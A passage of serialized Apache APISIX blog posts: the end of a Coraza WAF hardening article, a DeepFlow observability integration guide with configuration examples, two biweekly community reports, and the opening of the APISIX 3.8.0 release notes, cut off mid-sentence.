Injection\\nCoraza: Warning. Javascript method detected\\nCoraza: Access denied (phase 1). Inbound Anomaly Score Exceeded in phase 1\\n```\\n\\nCoraza did the job!\\n\\n## Conclusion\\n\\nMost organizations don\'t incentivize for security. Hence, we need to be smart about it and use existing components as much as possible.\\n\\nWe can harden Apache APISIX against the OWASP Top 10 by using Coraza and the Core Ruleset.\\n\\n**To go further:**\\n\\n* [OWASP Security Top 10](https://owasp.org/www-project-top-ten/)\\n* [OWASP ModSecurity Core Ruleset](https://coreruleset.org/)\\n* [OWASP Coraza WAF](https://coraza.io/)\\n* [APISIX - Integrate with Coraza](https://docs.api7.ai/apisix/how-to-guide/security/waf/integrate-with-coraza)\\n\\nThe complete source code for this post can be found on [GitHub](https://github.com//ajavageek/apisix-coraza)."},{"id":"Unlock All-in-One Observability for APISIX with DeepFlow","metadata":{"permalink":"/blog/2024/02/07/unlock-observability-for-apisix-with-deepflow","source":"@site/blog/2024/02/07/unlock-observability-for-apisix-with-deepflow.md","title":"Unlock All-in-One Observability for APISIX with DeepFlow","description":"This article aims to elucidate how to leverage DeepFlow\'s zero-code feature based on eBPF to construct an observability solution for APISIX.","date":"2024-02-07T00:00:00.000Z","formattedDate":"February 7, 2024","tags":[{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"}],"readingTime":11.14,"truncated":true,"authors":[{"name":"Qian Li","title":"Author"},{"name":"Bin Peng","title":"Author"}],"prevItem":{"title":"Hardening Apache APISIX with the OWASP\'s Coraza and Core Ruleset","permalink":"/blog/2024/02/13/apisix-owasp-coraza-core-ruleset"},"nextItem":{"title":"Biweekly Report (January 15 - January 28)","permalink":"/blog/2024/01/31/bi-weekly-report"}},"content":"> This article aims to elucidate how to leverage DeepFlow\'s zero-code feature based on eBPF to construct an observability solution for APISIX.\\n\x3c!--truncate--\x3e\\n\\nWith the growing emphasis on the observability of application components, Apache APISIX has introduced a plugin mechanism to enrich observability signals. However, these data are scattered across multiple stacks, creating data silos. **This article aims to elucidate how to leverage DeepFlow\'s zero-code feature based on eBPF to construct an observability solution for APISIX.** On this basis, it integrates the rich data sources of existing APISIX plugins to eliminate data silos and build an all-in-one platform for comprehensive observability of the APISIX gateway.\\n\\nThrough DeepFlow, APISIX can achieve comprehensive observability from traffic monitoring and tracing analysis to performance optimization, eliminating data dispersion and providing a centralized view. This accelerates fault diagnosis and performance tuning, making the work of DevOps and SRE teams more efficient. **This article will focus on how APISIX\'s tracing data, metric data, access logs, and performance profiling data can be integrated with DeepFlow.**\\n\\n![Integrating APISIX with DeepFlow](https://static.apiseven.com/uploads/2024/02/07/klRaMpb4_deepflow-1.jpeg)\\n\\n## 1. Install APISIX and DeepFlow\\n\\nFor convenience, this article describes deploying both DeepFlow and APISIX as Kubernetes services, with the entire deployment process taking approximately 5 minutes. For detailed deployment steps, refer to the [DeepFlow](https://deepflow.io/docs/ce-install/all-in-one/) and [APISIX](https://apisix.apache.org/docs/apisix/3.2/installation-guide/) official deployment documentation.\\n\\nNote: To leverage DeepFlow\'s observability capabilities that utilize eBPF technology, your host\'s **Linux kernel must be version 4.14 or higher**.\\n\\n## 2. Distributed Tracing\\n\\nThere are two approaches to implementing distributed tracing for APISIX and backend services using DeepFlow: Firstly, DeepFlow leverages eBPF to enable out-of-the-box, RPC-level distributed tracing for APISIX and backend services, requiring no code changes. Secondly, if backend services have APM (Application Performance Monitoring) tools like OpenTelemetry or SkyWalking enabled, you can integrate all tracing data into DeepFlow using the APISIX Tracers plugin. This enables comprehensive, end-to-end tracing at the application function level.\\n\\n![Integrating APISIX with DeepFlow](https://static.apiseven.com/uploads/2024/02/07/hA587UwF_deepflow-2.jpeg)\\n\\n### 2.1 DeepFlow eBPF AutoTracing\\n\\n**DeepFlow offers out-of-the-box distributed tracing (AutoTracing) that requires no APISIX plugins or code changes to be enabled.** It only necessitates deploying the deepflow-agent on the server where APISIX is located. In Grafana, find the [Distributed Tracing Dashboard provided by DeepFlow](https://ce-demo.deepflow.yunshan.net/d/Distributed_Tracing/distributed-tracing?orgId=1), where you can initiate a trace on a specific request and see the end-to-end trace of that request in both APISIX and its backend services, as illustrated below:\\n\\n- (1): Accesses the APISIX gateway service on the K8s Node NIC via nodeport.\\n- (2): Enters the NIC of the POD corresponding to the APISIX gateway service.\\n- (3): Goes into the OpenResty process within the APISIX gateway service.\\n- (4): The request is forwarded to the backend service by the OpenResty process.\\n- (5): Forwarded by the NIC of the POD corresponding to the APISIX gateway service.\\n- (6)/(7): Forwarded to the backend service.\\n\\n![Integrating APISIX with DeepFlow](https://static.apiseven.com/uploads/2024/02/07/XNkYJZ13_deepflow-3.jpeg)\\n\\n### 2.2 DeepFlow eBPF + OpenTelemetry\\n\\nThis approach involves APISIX generating trace data using the OpenTelemetry plugin, while the backend service also has APM capabilities and can convert generated trace data into the OpenTelemetry format. When APISIX and backend services both send trace data to DeepFlow, it can create a comprehensive trace-tree without any blind spots, incorporating APM application SPAN, eBPF system SPAN, and cBPF network SPAN.\\n\\nThis method is ideal for achieving function-level distributed tracing inside the application process or when the backend service uses a thread pool for call handling, which may disrupt DeepFlow AutoTracing.\\n\\n#### 2.2.1 Deploy Backend Services with APM Enabled\\n\\nTo demonstrate the full tracing effect, we first deploy a demo application behind the APISIX gateway that supports OpenTelemetry. The deployment of the Demo application can refer to: \\"[DeepFlow Demo - One-click deployment of a WebShop application composed of five microservices written in Spring Boot](https://deepflow.io/docs/integration/input/tracing/opentelemetry/#experience-based-on-the-spring-boot-demo)\\". Create a route on APISIX to access the backend service, with the access domain being `apisix.deepflow.demo`.\\n\\n```\\napiVersion: apisix.apache.org/v2\\nkind: ApisixRoute\\nmetadata:\\n  name: deepflow-apisix-demo\\n  namespace: deepflow-otel-spring-demo\\nspec:\\n  http:\\n    - name: deepflow-apisix-demo\\n      match:\\n        hosts:\\n          - apisix.deepflow.demo\\n        paths:\\n          - \\"/*\\"\\n      backends:\\n        - serviceName: web-shop\\n          servicePort: 18090\\n```\\n\\n#### 2.2.2 Enable the OpenTelemetry Plugin in APISIX\\n\\nAdd OpenTelemetry plugins to the APISIX configuration:\\n\\n```\\n## vim ./apisix/.values.yaml\\nplugins:\\n  - opentelemetry\\n#...\\npluginAttrs:\\n  opentelemetry:\\n    resource:\\n      service.name: APISIX\\n    collector:\\n      ## Send data to deepflow-agent\\n      ## Of course, you can also send it to otel-collector for processing, and then have otel-collector forward it to deepflow-agent\\n      address: deepflow-agent.deepflow.svc.cluster.local/api/v1/otel/trace\\n      request_timeout: 3\\n\\n## After adding, update helm upgrade --install -n apisix apisix ./apisix\\n```\\n\\nEnable OpenTelemetry functionality for a specific route:\\n\\n```\\n## View router id\\n## Find the router id for the domain\\ncurl -s http://10.109.77.186:9180/apisix/admin/routes -H \'X-API-KEY: This is apisix-admin token\' | jq\\n```\\n\\n```\\n## Enable the otel feature for a specific route\\ncurl http://10.109.77.186:9180/apisix/admin/routes -H \'X-API-KEY: This is apisix-admin token\' -X PUT -d \'\\n{\\n    \\"name\\": \\"deepflow-apisix-demo\\",            ## Assign a name to this route\\n    \\"methods\\": [\\"GET\\"],\\n    \\"uris\\": [\\"/*\\"],\\n    \\"plugins\\": {\\n        \\"opentelemetry\\": {\\n            \\"sampler\\": {\\n                \\"name\\": \\"always_on\\"\\n            },\\n            \\"additional_attributes\\": [        ## Customize tags for span through `additional_attributes`\\n                \\"deepflow=demo\\"\\n            ]\\n        }\\n    },\\n    \\"upstream\\": {\\n        \\"type\\": \\"roundrobin\\",                 ## Round Robin Load Balancing\\n        \\"nodes\\": {                            ## Upstream Address\\n            \\"10.1.23.200:18090\\": 1            ## Service access address: Upstream ID\\n        }\\n    }\\n}\'\\n```\\n\\n#### 2.2.3 Using DeepFlow to Integrate OpenTelemetry Traces\\n\\nThe integration of OpenTelemetry Span data through DeepFlow Agent is enabled by default and requires no additional configuration.\\n\\n```\\n## View the default configuration of deepflow-agent\\n## deepflow-ctl agent-group-config example\\n\\n## This parameter controls whether to enable receiving data from external sources, including Prometheus, Telegraf, OpenTelemetry, and SkyWalking.\\n## Data Integration Socket\\n## Default: 1. Options: 0 (disabled), 1 (enabled).\\n## Note: Whether to enable receiving external data sources such as Prometheus,\\n##   Telegraf, OpenTelemetry, and SkyWalking.\\n#external_agent_http_proxy_enabled: 1\\n```\\n\\n#### 2.2.4 OpenTelemetry Integration Showcase\\n\\nWe initiate a command from the client to access the WebShop service:\\n\\n```\\ncurl -H \\"Host: apisix.deepflow.demo\\" 10.1.23.200:44640/shop/full-test\\n## Here, the IP is the K8s cluster node IP, and port 44640 is the NodePort exposed by APISIX 9180.\\n```\\n\\nOpen the [Distributed Tracing Dashboard provided by DeepFlow](https://ce-demo.deepflow.yunshan.net/d/Distributed_Tracing/distributed-tracing?orgId=1) in Grafana, find the corresponding request, and initiate tracing. You\'ll be able to see traces from both APISIX and the backend services. Moreover, the application SPANs generated by APM and the network SPANs and system SPANs generated by DeepFlow are all comprehensively associated on one flame graph:\\n\\n> Note: In the flame graph, \\"A\\" represents the application SPAN generated by APM, while \\"N\\" and \\"S\\" represent the network SPAN and system SPAN generated by DeepFlow, respectively.\\n\\n![Integrating APISIX with DeepFlow](https://static.apiseven.com/uploads/2024/02/07/UqbPnqST_deepflow-4.jpeg)\\n\\n## 3. Performance Metrics\\n\\nDeepFlow offers immediate insights into metrics, featuring detailed RED (Rate, Error, Duration) performance metrics at the endpoint level, along with comprehensive TCP network performance metrics, including throughput, retransmissions, zero window, and connection anomalies. Metrics from APISIX, including HTTP status codes, bandwidth, connections, and latency, captured by Metrics-type plugins like Prometheus and node-status, can also be integrated into DeepFlow. This data, detailing both instance and route granularity, is viewable on the APISIX-provided Grafana Dashboard.\\n\\n![Integrating APISIX with DeepFlow](https://static.apiseven.com/uploads/2024/02/07/moFwGgPH_deepflow-5.jpeg)\\n\\n### 3.1 Out-of-the-Box eBPF Metrics\\n\\nOnce the deepflow-agent is deployed on the server hosting APISIX, it automatically gathers highly detailed application and network level metrics. This includes metrics such as request rates, response latencies, and error statuses for specific clients or endpoints, as well as TCP connection setup times, connection anomalies, and more. Detailed metrics can be found on [the DeepFlow official website in the metrics section](https://deepflow.io/docs/features/universal-map/metrics-and-operators/). By opening the **Application - K8s Ingress Dashboard** provided by DeepFlow in Grafana, you can view application layer performance metrics related to APISIX. Similarly, network-related metrics can be viewed in the **Network - K8s Pod** Dashboard.\\n\\n![Integrating APISIX with DeepFlow](https://static.apiseven.com/uploads/2024/02/07/lbVMAzAa_deepflow-6.jpeg)\\n\\n![Integrating APISIX with DeepFlow](https://static.apiseven.com/uploads/2024/02/07/3615sk3K_deepflow-7.jpeg)\\n\\n### 3.2 Enable the Prometheus Plugin in APISIX\\n\\nAdd the Prometheus plugin to the APISIX configuration:\\n\\n```\\n## vim ./apisix/.values.yaml\\nplugins:\\n  - prometheus\\n# ...\\npluginAttrs:\\n  prometheus:\\n    export_uri: /metrics    ## The default URI is `/apisix/prometheus/metrics`\\n    export_addr:\\n      ip: 0.0.0.0           ## Scrape Address\\n      port: 9091            ## Default port 9091\\n    metrics:\\n      http_status:  \\n        extra_labels:\\n          - upstream_addr: $upstream_addr        ## For example, add an upstream server address (the variable here is an NGINX variable)\\n          - upstream_status: $upstream_status    ## For example, add the status of an upstream server (the variable here is an NGINX variable)\\n                                                 ## APISIX Built-in Variables: https://apisix.apache.org/docs/apisix/3.2/apisix-variable/\\n                                                 ## NGINX Built-in Variables\uff1ahttps://nginx.org/en/docs/varindex.html\\n```\\n\\nEnable Prometheus plugin:\\n\\n```\\n## Note: Since the otel feature has been enabled above, here we need to enable Prometheus on top of the otel functionality.\\n\\ncurl http://10.109.77.186:9180/apisix/admin/routes/$router_id -H \'X-API-KEY: $apisix-admin token\' -X PUT -d \'\\n{\\n    \\"name\\": \\"deepflow-apisix-demo\\",       ## Assign a name to this route\\n    \\"methods\\": [\\"GET\\"],\\n    \\"uris\\": [\\"/*\\"],\\n    \\"plugins\\": {\\n        \\"prometheus\\":{                    ## Enable Prometheus\\n            \\"prefer_name\\": true           ## When set to \\"true,\\" the Prometheus metrics will display the route/service name instead of the ID.\\n        }\\n    },\\n    \\"upstream\\": {\\n        \\"type\\": \\"roundrobin\\",\\n        \\"nodes\\": {\\n            \\"10.1.23.200:18090\\": 1\\n        }\\n    }\\n}\'\\n```\\n\\n### 3.3 Collect APISIX Metrics with Prometheus\\n\\nCollecting APISIX metrics using Prometheus (example given using Prometheus CRD deployment method):\\n\\n```\\n## Collecting via ServiceMonitor Method (Prometheus deployed in Kubernetes as a CRD)\\n## The APISIX `values.yaml` file provides the corresponding module\\nserviceMonitor:\\n  ## Whether to enable\\n  enabled: true\\n  ## Which namespace to create in\\n      namespace: \\"apisix\\"\\n  ## ServiceMonitor name, defaults to fullname\\n  name: \\"\\"\\n  ## Scrape interval\\n  interval: 15s\\n  ## URI where metrics are exposed\\n  path: /metrics\\n  ## Prefix for the scraped metrics\\n  metricPrefix: apisix_\\n  ## Scrape port\\n  containerPort: 9091\\n  ## Add labels\\n  labels:\\n    ## For this deployment, the project uses kube-prometheus; use this label for kube-prometheus to recognize the ServiceMonitor\\n    app.kubernetes.io/part-of: kube-prometheus\\n  annotations: {}\\n```\\n\\nAt this point, a Prometheus backend service is required to collect the metrics generated by APISIX plugins. Therefore, it is necessary to deploy a `prometheus-server` first. However, since these metrics do not rely on prometheus-server for storage, it is possible to deploy a prometheus-server in agent mode or use a lighter weight grafana-agent instead. Assuming that prometheus-server has been deployed, enabling `RemoteWrite` will send metric data to DeepFlow:\\n\\n```\\n## https://prometheus.io/docs/prometheus/latest/configuration/configuration/#remote_write\\n## https://deepflow.io/docs/zh/integration/input/metrics/prometheus/#\u914d\u7f6e-remote-write\\n\\n## Sending to DeepFlow via kube-prometheus (adding remote write in the YAML manifest)\\napiVersion: monitoring.coreos.com/v1\\nkind: Prometheus\\nmetadata:\\n  labels:\\n    ...\\n  name: k8s\\n  namespace: monitoring\\nspec:\\n  enableRemoteWriteReceiver: true\\n  remoteWrite:\\n    ## Note: Here should be the deepflow-agent service address, which needs to be specified according to the actual location.\\n    - url: \\"http://deepflow-agent.deepflow.svc.cluster.local/api/v1/prometheus\\"\\n```\\n\\n### 3.4 Integrating Prometheus Metrics with DeepFlow\\n\\nIntegrating Prometheus metrics through deepflow-agent is enabled by default and requires no additional configuration.\\n\\n```\\n## View the default configuration of deepflow-agent\\n## deepflow-ctl agent-group-config example\\n\\n## This parameter controls whether to accept data from external sources, including Prometheus, Telegraf, OpenTelemetry, and SkyWalking.\\n## Data Integration Socket\\n## Default: 1. Options: 0 (disabled), 1 (enabled).\\n## Note: Whether to enable receiving external data sources such as Prometheus,\\n##   Telegraf, OpenTelemetry, and SkyWalking.\\n#external_agent_http_proxy_enabled: 1\\n```\\n\\n### 3.5 Prometheus Integration Showcase\\n\\nSince DeepFlow supports PromQL, you only need to change the data-source in the [Grafana dashboard](https://github.com/apache/apisix/blob/master/docs/assets/other/json/apisix-grafana-dashboard.json) provided by APISIX to DeepFlow. This way, you can view the rich performance metrics natively provided by APISIX. For instructions on how to use these metrics, refer to [the official documentation regarding the Prometheus plugin](https://apisix.apache.org/docs/apisix/plugins/prometheus/).\\n\\n![Integrating APISIX with DeepFlow](https://static.apiseven.com/uploads/2024/02/07/3S4sUpX2_deepflow-8.jpeg)\\n\\n## 4. Access Logs and Continuous Profiling\\n\\n![Integrating APISIX with DeepFlow](https://static.apiseven.com/uploads/2024/02/07/7KO1FcJL_deepflow-8.1.jpeg)\\n\\nFor access logs, there is no need for APISIX to be modified in any way. Simply deploying deepflow-agent on the server where APISIX is located. By opening the [Application - Request Log Dashboard provided by DeepFlow](https://ce-demo.deepflow.yunshan.net/d/Application_Request_Log/application-request-log?orgId=1) in Grafana, you can view the access logs, which include header information from both the Request and Response. Additionally, you can analyze the response latency and error codes for each request.\\n\\n![Integrating APISIX with DeepFlow](https://static.apiseven.com/uploads/2024/02/07/4bOa7VKs_deepflow-9.jpeg)\\n\\nDeepFlow also utilizes eBPF to capture function call stacks of applications, a feature available in the enterprise edition. This functionality enables the generation of an On-CPU Profile for the APISIX process, detailing the function call stack. It encompasses not just application functions but also the time spent in libraries and kernel syscalls.\\n\\n![Integrating APISIX with DeepFlow](https://static.apiseven.com/uploads/2024/02/07/KveTMwaQ_deepflow-10.jpeg)\\n\\n## 5. What is APISIX\\n\\n[Apache APISIX](https://apisix.apache.org/) is a dynamic, real-time, high-performance open-source API gateway that provides rich traffic management functions such as load balancing, dynamic upstream, canary release, circuit breaking, authentication, and observability. Being built based on NGINX and LuaJIT, Apache APISIX has ultra-high performance with a single-core QPS of up to 23,000 and an average delay of only 0.2 milliseconds. It can solve problems in traditional architecture, and at the same time adapt to the needs of the cloud-native era.\\n\\nAs an API gateway, Apache APISIX has a wide range of application scenarios. It can be applied to scenarios such as gateways, Kubernetes Ingress Controller, and service mesh, and can help enterprises quickly and safely process API and microservice traffic. At present, it has been tested and highly recognized by worldwide enterprises and organizations such as Zoom, Airwallex, Lotus Cars, vivo, and European Factory Platform.\\n\\nOpen-sourced and donated by API7.ai to Apache Software Foundation in 2019, Apache APISIX is now the most active API gateway project on GitHub addressing 1 Trillion+ API calls per day, which is still growing.\\n\\nGitHub address\uff1a[https://github.com/apache/apisix](https://github.com/apache/apisix)\\n\\n## 6. What is DeepFlow\\n\\nDeepFlow, an open-source observability project, aims to deliver comprehensive observability for complex cloud infrastructures and cloud-native applications. Utilizing eBPF technology, it offers application performance metrics, distributed tracing, and continuous profiling with zero-code instrumentation, thanks to its integration of smart-encoding technology for full-stack correlation. DeepFlow enables automatic deep observability for cloud-native applications, easing developers\' workload and equipping DevOps/SRE teams with advanced monitoring and diagnostic tools that span from code to infrastructure.\\n\\nGitHub address\uff1a[https://github.com/deepflowio/deepflow](https://github.com/deepflowio/deepflow)"},{"id":"Biweekly Report (January 15 - January 28)","metadata":{"permalink":"/blog/2024/01/31/bi-weekly-report","source":"@site/blog/2024/01/31/bi-weekly-report.md","title":"Biweekly Report (January 15 - January 28)","description":"Our bi-weekly Apache APISIX community report is your window into the project\'s weekly developments. It is a tool to facilitate your seamless integration into the Apache APISIX community, ensuring that you stay well-informed and actively involved.","date":"2024-01-31T00:00:00.000Z","formattedDate":"January 31, 2024","tags":[{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":1.68,"truncated":true,"authors":[],"prevItem":{"title":"Unlock All-in-One Observability for APISIX with DeepFlow","permalink":"/blog/2024/02/07/unlock-observability-for-apisix-with-deepflow"},"nextItem":{"title":"Biweekly Report (January 01 - January 14)","permalink":"/blog/2024/01/18/bi-weekly-report"}},"content":"> We have recently added the `ocsp-stapling` plugin within Apache APISIX. Please read the bi-weekly report for more details.\\n\x3c!--truncate--\x3e\\n\\n## Introduction\\n\\nFrom its inception, the Apache APISIX project has embraced the ethos of open-source community collaboration, propelling it into the ranks of the most active global open-source API gateway projects. The proverbial wisdom of \'Many hands make light work\' rings true in our way, made possible by the collective dedication of our community.\\n\\nFrom 01.15 to 01.28, a total of 19 contributors made 38 commits to Apache APISIX. We sincerely appreciate your contributions to Apache APISIX.\\n\\nWe have recently added a plugin:\\n\\n- Add the `ocsp-stapling` plugin\\n\\nOur bi-weekly Apache APISIX community report is your window into the project\'s weekly developments. It is a tool to facilitate your seamless integration into the Apache APISIX community, ensuring that you stay well-informed and actively involved.\\n\\n## Contributor Statistics\\n\\n![Apache APISIX Contributors List](https://static.apiseven.com/uploads/2024/01/30/TNYMwOwg_20240130_ALL.png)\\n\\n![Apache APISIX New Contributors](https://static.apiseven.com/uploads/2024/01/30/tboLrqhc_20240130_New.png)\\n\\n## Highlight of Recent Feature\\n\\n- [Add the `ocsp-stapling` plugin](https://github.com/apache/apisix/pull/10817) (Contributor: [yuweizzz](https://github.com/yuweizzz))\\n\\n## Recent Blog Recommendations\\n\\n- [Release Apache APISIX 3.8.0](https://apisix.apache.org/blog/2024/01/15/release-apache-apisix-3.8.0/)\\n\\n  We are glad to present Apache APISIX 3.8.0 with exciting new features, bug fixes, and other improvements to user experiences.\\n\\n- [Enhancing Security and Performance: DataVisor\'s Dynamic Use of APISIX](https://apisix.apache.org/blog/2023/12/19/datavisor-uses-apisix/)\\n\\n  Author: Xiaobiao Zhao, DataVisor Senior Architect, Apache Kvrocks Committer, OpenResty and Apache APISIX Contributor. This article is based on a presentation given by Xiaobiao Zhao at the APISIX Shanghai Meetup in November 2023.\\n\\n- [Apache APISIX plugin priority, a leaky abstraction?](https://apisix.apache.org/blog/2023/12/14/apisix-plugins-priority-leaky-abstraction/)\\n\\n  Apache APISIX builds upon the OpenResty reverse-proxy to offer a plugin-based architecture. The main benefit of such an architecture is that it brings structure to the configuration of routes. It\'s a help at scale, when managing hundreds or thousands of routes.\\n\\nA wealth of documentation tutorials and experience has been accumulated on the Apache APISIX official website and GitHub. If you encounter problems, you can look into the documentation, search keywords in the issues, or participate in the discussion on the issues, proposing your own ideas and practical experience."},{"id":"Biweekly Report (January 01 - January 14)","metadata":{"permalink":"/blog/2024/01/18/bi-weekly-report","source":"@site/blog/2024/01/18/bi-weekly-report.md","title":"Biweekly Report (January 01 - January 14)","description":"Our bi-weekly Apache APISIX community report is your window into the project\'s weekly developments. It is a tool to facilitate your seamless integration into the Apache APISIX community, ensuring that you stay well-informed and actively involved.","date":"2024-01-18T00:00:00.000Z","formattedDate":"January 18, 2024","tags":[{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":2.41,"truncated":true,"authors":[],"prevItem":{"title":"Biweekly Report (January 15 - January 28)","permalink":"/blog/2024/01/31/bi-weekly-report"},"nextItem":{"title":"Release Apache APISIX 3.8.0","permalink":"/blog/2024/01/15/release-apache-apisix-3.8.0"}},"content":"> We have recently made some additions and improvements to specific features within Apache APISIX. The updates include the newly added include_req_body option for some log-related plugins, supporting one-click compilation and installation of apisix and apisix-runtime from source code, the `response-rewrite` plugin supporting Brotli compression when using the filters.regex option, and supporting the uri_param_ variable when using the radixtree_uri_with_parameter routing engine. For additional information, please consult the bi-weekly report.\\n\x3c!--truncate--\x3e\\n\\n## Introduction\\n\\nFrom its inception, the Apache APISIX project has embraced the ethos of open-source community collaboration, propelling it into the ranks of the most active global open-source API gateway projects. The proverbial wisdom of \'Many hands make light work\' rings true in our way, made possible by the collective dedication of our community.\\n\\nFrom 01.01 to 01.14, a total of 20 contributors made 32 commits to Apache APISIX. We sincerely appreciate your contributions to Apache APISIX.\\n\\nWe have recently added and enhanced several plugins, and here is a summary of the updates:\\n\\n1. Newly added include_req_body option for some log-related plugins\\n\\n2. Support one-click compilation and installation of apisix and apisix-runtime from source code\\n\\n3. The `response-rewrite` plugin supports Brotli compression when using the filters.regex option\\n\\n4. Support the uri_param_ variable when using the radixtree_uri_with_parameter routing engine\\n\\nOur bi-weekly Apache APISIX community report is your window into the project\'s weekly developments. It is a tool to facilitate your seamless integration into the Apache APISIX community, ensuring that you stay well-informed and actively involved.\\n\\n## Contributor Statistics\\n\\n![Apache APISIX Contributors List](https://static.apiseven.com/uploads/2024/01/18/2DEKfgEm_List_Cons.png)\\n\\n![Apache APISIX New Contributors](https://static.apiseven.com/uploads/2024/01/18/XLn0OLo4_List_New.png)\\n\\n## Highlight of Recent Feature\\n\\n- [Newly added include_req_body option for some log-related plugins](https://github.com/apache/apisix/pull/10738) (Contributor: [smileby](https://github.com/smileby))\\n\\n- [Support one-click compilation and installation of apisix and apisix-runtime from source code](https://github.com/apache/apisix/pull/10729) (Contributor: [Vacant2333](https://github.com/Vacant2333))\\n\\n- [The `response-rewrite` plugin supports Brotli compression when using the filters.regex option](https://github.com/apache/apisix/pull/10733) (Contributor: [yuweizzz](https://github.com/yuweizzz))\\n\\n- [Support the uri_param_ variable when using the radixtree_uri_with_parameter routing engine](https://github.com/apache/apisix/pull/10645) (Contributor: [boekkooi-lengoo](https://github.com/boekkooi-lengoo))\\n\\n## Recent Blog Recommendations\\n\\n- [Release Apache APISIX 3.8.0](https://apisix.apache.org/blog/2024/01/15/release-apache-apisix-3.8.0/)\\n\\n  We are glad to present Apache APISIX 3.8.0 with exciting new features, bug fixes, and other improvements to user experiences.\\n\\n- [Enhancing Security and Performance: DataVisor\'s Dynamic Use of APISIX](https://apisix.apache.org/blog/2023/12/19/datavisor-uses-apisix/)\\n\\n  Author: Xiaobiao Zhao, DataVisor Senior Architect, Apache Kvrocks Committer, OpenResty and Apache APISIX Contributor. This article is based on a presentation given by Xiaobiao Zhao at the APISIX Shanghai Meetup in November 2023.\\n\\n- [Apache APISIX plugin priority, a leaky abstraction?](https://apisix.apache.org/blog/2023/12/14/apisix-plugins-priority-leaky-abstraction/)\\n\\n  Apache APISIX builds upon the OpenResty reverse-proxy to offer a plugin-based architecture. The main benefit of such an architecture is that it brings structure to the configuration of routes. It\'s a help at scale, when managing hundreds or thousands of routes.\\n\\nA wealth of documentation tutorials and experience has been accumulated on the Apache APISIX official website and GitHub. If you encounter problems, you can look into the documentation, search keywords in the issues, or participate in the discussion on the issues, proposing your own ideas and practical experience."},{"id":"Release Apache APISIX 3.8.0","metadata":{"permalink":"/blog/2024/01/15/release-apache-apisix-3.8.0","source":"@site/blog/2024/01/15/release-apache-apisix-3.8.0.md","title":"Release Apache APISIX 3.8.0","description":"The Apache APISIX 3.8.0 version is released on January 15, 2024. This release includes a few new features, bug fixes, and other improvements to user experiences.","date":"2024-01-15T00:00:00.000Z","formattedDate":"January 15, 2024","tags":[{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":3.345,"truncated":true,"authors":[{"name":"Xin Rong","title":"Author","url":"https://github.com/AlinsRan","image_url":"https://github.com/AlinsRan.png","imageURL":"https://github.com/AlinsRan.png"},{"name":"Traky Deng","title":"Technical Writer","url":"https://github.com/kayx23","image_url":"https://github.com/kayx23.png","imageURL":"https://github.com/kayx23.png"}],"prevItem":{"title":"Biweekly Report (January 01 - January 14)","permalink":"/blog/2024/01/18/bi-weekly-report"},"nextItem":{"title":"Biweekly Report (December 18 - December 31)","permalink":"/blog/2024/01/03/bi-weekly-report"}},"content":"We are glad to present Apache APISIX 3.8.0 with exciting new features, bug fixes, and other improvements to user experiences.\\n\\n\x3c!--truncate--\x3e\\n\\nThis new release adds a number of new features, including the support for JWE decryption, brotli compression, multiple authentication methods on routes and services, required scopes in `openid-connect` plugin, and more.\\n\\n## New Features\\n\\n### Support decrypting JWE in requests using `jwe-decrypt` plugin\\n\\nSupport the decryption of [JWE](https://datatracker.ietf.org/doc/html/rfc7516) authorization headers in requests with the new `jwe-decrypt` plugin.\\n\\nThe plugin creates an internal endpoint `/apisix/plugin/jwe/encrypt` for JWE encryption, which can be exposed using the `public-api` plugin. You will also configure the decryption key in Consumers.\\n\\nFor more information, see [PR #10252](https://github.com/apache/apisix/pull/10252) and [plugin documentation](https://github.com/apache/apisix/blob/master/docs/en/latest/plugins/jwe-decrypt.md).\\n\\n### Support multiple authentication methods on routes and services\\n\\nSupport multiple authentication methods on routes and services with the new `multi-auth` plugin. The plugin iterates through the list of authentication plugins configured in the `auth_plugins` attribute. It allows consumers using different authentication methods to share the same route or service.\\n\\nFor example, you can have one consumer using basic authentication:\\n\\n```shell\\ncurl http://127.0.0.1:9180/apisix/admin/consumers -X PUT \\\\\\n  -H \\"X-API-KEY: ${ADMIN_API_KEY}\\" \\\\\\n  -d \'{\\n    \\"username\\": \\"consumer1\\",\\n    \\"plugins\\": {\\n      \\"basic-auth\\": {\\n        \\"username\\": \\"consumer1\\",\\n        \\"password\\": \\"consumer1_pwd\\"\\n      }\\n    }\\n  }\'\\n```\\n\\nAnd another consumer using key authentication:\\n\\n```shell\\ncurl http://127.0.0.1:9180/apisix/admin/consumers -X PUT \\\\\\n  -H \\"X-API-KEY: ${ADMIN_API_KEY}\\" \\\\\\n  -d \'{\\n    \\"username\\": \\"consumer2\\",\\n    \\"plugins\\": {\\n      \\"key-auth\\": {\\n        \\"key\\": \\"consumer2_s3cr3t\\"\\n      }\\n    }\\n  }\'\\n```\\n\\nBoth consumers can access the route below upon successful authentication using their respective authentication method:\\n\\n```shell\\ncurl http://127.0.0.1:9180/apisix/admin/routes/1 -X PUT \\\\\\n  -H \\"X-API-KEY: ${ADMIN_API_KEY}\\" \\\\\\n  -d \'{\\n    \\"methods\\": [\\"GET\\"],\\n    \\"uri\\": \\"/get\\",\\n    \\"plugins\\": {\\n      \\"multi-auth\\":{\\n        \\"auth_plugins\\":[\\n          {\\n            \\"basic-auth\\":{ }\\n          },\\n          {\\n            \\"key-auth\\":{\\n              \\"query\\":\\"apikey\\",\\n              \\"hide_credentials\\":true,\\n              \\"header\\":\\"apikey\\"\\n             }\\n          }\\n        ]\\n      }\\n    },\\n    \\"upstream\\": {\\n      \\"type\\": \\"roundrobin\\",\\n      \\"nodes\\": {\\n        \\"httpbin.org\\": 1\\n      }\\n    }\\n  }\'\\n```\\n\\nFor more information, see [PR #10482](https://github.com/apache/apisix/pull/10482) and [plugin documentation](https://github.com/apache/apisix/blob/master/docs/en/latest/plugins/multi-auth.md).\\n\\n### Support the use of `filters.regex` with compressed data in `response-rewrite` plugin\\n\\nSupport the use of `filters.regex` with brotli and gzip compressed data in `response-rewrite` plugin.\\n\\nFor more information, see [PR #10588](https://github.com/apache/apisix/pull/10588) and [PR #10637](https://github.com/apache/apisix/pull/10637).\\n\\n### Support specifying the required scopes in `openid-connect` plugin\\n\\nSupport specifying the required scopes in `openid-connect` plugin in the `required_scopes` attribute. When configured, the plugin will check if all required scopes are present in the scopes returned by the introspection endpoint.\\n\\nFor more information, see [PR #10493](https://github.com/apache/apisix/pull/10493).\\n\\n### Support `Timing-Allow-Origin` header in `cors` plugin\\n\\nNew attributes `timing_allow_origins` and `timing_allow_origins_by_regex` are available in the cors 